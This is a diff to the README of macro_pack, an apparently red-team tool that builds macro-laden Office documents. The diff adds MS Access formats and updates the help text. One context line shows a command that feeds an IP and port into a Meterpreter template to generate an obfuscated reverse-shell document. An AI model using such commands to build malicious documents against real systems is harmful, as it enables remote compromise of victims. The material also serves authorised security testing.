@@ -50,6 +50,7 @@ Ms Office Supported formats are:
 * MS Excel 97 (.xls)
 * MS Excel (.xlsm, .xslx, .xltm)
 * MS PowerPoint (.pptm, .potm)
+* MS Access (.accdb, .mdb)
 * MS Visio 97 (.vsd)
 * MS Visio (.vsdm)
 * MS Project (.mpp)
@@ -117,8 +118,6 @@ git clone https://github.com/sevagas/macro_pack.git
 cd macro_pack
 pip3 install -r requirements.txt
 ```
-
-**Note:** For windows, you also need to download manually pywin32 from https://sourceforge.net/projects/pywin32/files/pywin32/
 
 The tool is in python 3 so just start with with your python3 install. ex:
 ```bash
@@ -309,7 +308,7 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
         Help for template usage: macro_pack.exe -t help
          
     -G, --generate=OUTPUT_FILE_PATH. Generates a file. Will guess the format based on extension.
-        Supported Ms Office extensions are: doc, docm, docx, dotm, xls, xlsm, xslx, xltm, pptm, potm, vsd, vsdm, mpp.
+        Supported Ms Office extensions are: doc, docm, docx, dotm, xls, xlsm, xslx, xltm, pptm, potm, vsd, vsdm, accdb, mdb, mpp.
         Note: Ms Office file generation requires Windows OS with right MS Office application installed.
         Supported Visual Basic scripts extensions are: vba, vbs, wsf, wsc, sct, hta, xsl.
         Supported shortcuts/shell extensions are: lnk, scf, url, glk, settingcontent-ms, library-ms, inf, iqy
